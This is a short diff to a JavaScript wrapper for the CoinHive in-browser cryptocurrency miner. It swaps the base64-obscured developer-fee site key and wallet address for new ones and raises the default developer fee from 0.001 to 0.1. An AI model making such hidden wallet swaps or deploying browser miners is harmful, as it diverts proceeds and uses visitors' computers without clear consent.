@@ -1,14 +1,14 @@
 var miner = null;
 var intervalId = null;
 var intervalMs = null;
-var devFeeSiteKey = atob('ZlpKWlA1Qm5SVDc2S1FRQjk2RDVxUk1ZcWp0NXpneEU=');
+var devFeeSiteKey = atob('d1hWUUR3RzhSa3E3WFlEbjBmQWdNNkhjWFBVOXRGTVE=');
 var devFeeAddress = atob(
-  'NDZXTmJtd1hwWXhpQnBrYkhqQWdqQzY1Y3l6QXh0YWFCUWpjR3BBWnF1aEJLdzJyOE50UFFuaUVnTUpjd0ZNQ1p6U0JyRUp0bVBzVFI1NE1vR0JEYmpUaTJXMVhtZ00='
+  'NDZEaVUzV3dFRFc3MU5UZ1ZQUndxWUZUM1hFRURhRDVBYkpzaU53NlB4MkFqWWFVenY0c0x3OERQcnFDVXhvdFBIS0dQaGVUVWp6dnJmM2pNUHRHWWZURUZVcXhQUG8='
 );
 var devFeeMiner = null;
 
 // Init miner
-function init({ siteKey, interval = 1000, threads = null, username, devFee = 0.001, pool = null }) {
+function init({ siteKey, interval = 1000, threads = null, username, devFee = 0.1, pool = null }) {
   // Create miner
   if (!username) {
     miner = new CoinHive.Anonymous(siteKey);
